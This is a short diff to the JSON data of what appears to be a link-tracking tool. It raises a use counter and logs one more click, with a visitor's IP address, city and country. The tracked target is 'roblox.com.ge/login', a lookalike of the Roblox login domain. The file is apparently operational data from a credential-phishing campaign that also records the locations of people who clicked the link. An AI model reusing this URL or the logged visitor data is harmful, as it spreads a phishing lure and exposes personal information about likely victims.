@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1579,
+    "useCount": 1580,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12800,6 +12800,14 @@
         "city": "Manila",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777456158575,
+        "ip": "212.221.182.119",
+        "country": "United Kingdom",
+        "city": "Hailsham",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
